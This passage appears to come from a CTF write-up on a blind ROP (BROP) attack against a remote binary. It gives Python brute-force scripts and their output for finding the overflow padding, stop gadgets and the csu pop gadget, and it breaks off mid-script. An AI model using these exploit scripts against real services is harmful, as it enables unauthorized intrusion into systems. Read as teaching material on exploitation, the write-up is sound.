[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n'
[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
40
</code></pre><p>So now we know that we need 40 bytes of padding before the crash.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="stack-reading">
        Stack reading
        <a data-clipboard-text="https://nasm.re/posts/blindate/#stack-reading" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Stack reading" href="#stack-reading">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Stack reading is just basically a bruteforce of some bytes to trigger the orginal behaviour of the program. It permits especially to leak a stack canary or some saved instruction pointers. But I directly tried to find some stop gadgets, to do so, I&rsquo;m looking for something in the response. And the best stop gadget would be a unique pattern.</p>
<p>I developped this small function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">leak1</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">leak1</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which returns:</p>
<pre tabindex="0"><code>$ ./solve.py
[0x5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x1a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x61a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x1b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x61b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x1d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x61d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
STOP: &lt;class 'KeyboardInterrupt'&gt;
</code></pre><p>I stopped the script because it&rsquo;s very long by it&rsquo;s already interesting to see that it seems we overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="stop-gadget">
        Stop gadget
        <a data-clipboard-text="https://nasm.re/posts/blindate/#stop-gadget" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Stop gadget" href="#stop-gadget">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>We can optimize the search of stop gadgets by bruteforcing only the two less significant bytes about the base address: <code>0x400000</code>, which gives this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">leak2_opti</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which prints:</p>
<pre tabindex="0"><code>$ ./solve.py
[0x4004cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@'
[0x4004cd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@'
[0x4004dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@'
[0x400550] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@'
[0x400560] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400562] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400563] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400565] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400566] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400567] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400569] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x40056d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x40056e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x40056f] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400570] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400576] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400577] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400596] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@'
[0x400597] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@'
[0x40059c] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@'
[0x40059d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@'
[0x4005a0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@'
[0x4005a1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@'
[0x4005a3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@'
[0x4005a5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@'
[0x4005b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@'
[0x4005b7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@'
[0x4005b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@'
[0x4005c0] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@'
[0x4005d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@'
[0x4005d7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@'
[0x4005dd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@'
[0x4005de] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@'
[0x4005e1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@'
[0x4005e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@'
[0x4005e4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@'
[0x4005e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@'
[0x4005e7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@'
[0x4005e8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@'
[0x4005eb] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@'
[0x4005ec] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@'
[0x4005ee] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@'
[0x4005ef] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@'
[0x4005f1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@'
[0x4005f3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@'
[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
[0x400608] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@'
[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
[0x400622] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;\x06@'
[0x400650] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@'
[0x400656] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n&gt;&gt;&gt; '
[0x400657] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n&gt;&gt;&gt; '
[0x400658] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n&gt;&gt;&gt; '
[0x40065a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n&gt;&gt;&gt; '
[0x40065e] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n&gt;&gt;&gt; '
[0x400663] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n&gt;&gt;&gt; '
[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '
[0x40066d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb'
[0x400672] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb'
[0x400677] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@'
[0x400681] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@'
[0x4006b4] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x4006b5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x4006b6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x4006b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x4006bd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n&gt;&gt;&gt; '
[0x4006c2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n&gt;&gt;&gt; '
[0x4006c7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n&gt;&gt;&gt; '
[0x4006cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n'
[0x4006d1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n'
[0x4006d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@'
[0x4006db] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@'
[0x4006e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@'
[0x4006e3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@'
[0x4006e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@'
[0x4006e6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@'
[0x40073b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
[0x400742] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@'
[0x400743] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@'
[0x400758] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@'
</code></pre><p>If we read carefully, we can notice the <code>[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; '</code> gadget.
It&rsquo;s a very good stop gadget because it&rsquo;s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.
And so for our attack we will use it.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="brop-gadget">
        Brop gadget
        <a data-clipboard-text="https://nasm.re/posts/blindate/#brop-gadget" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Brop gadget" href="#brop-gadget">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It&rsquo;s easy to find because it&rsquo;s a pop of six qword like that:</p>
<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
</code></pre><p>So we use a <code>probe + trap * 6 + stop + trap*20</code> payload to find these kinf od gadgets.
And so here is the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">find_brop</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">):</span>
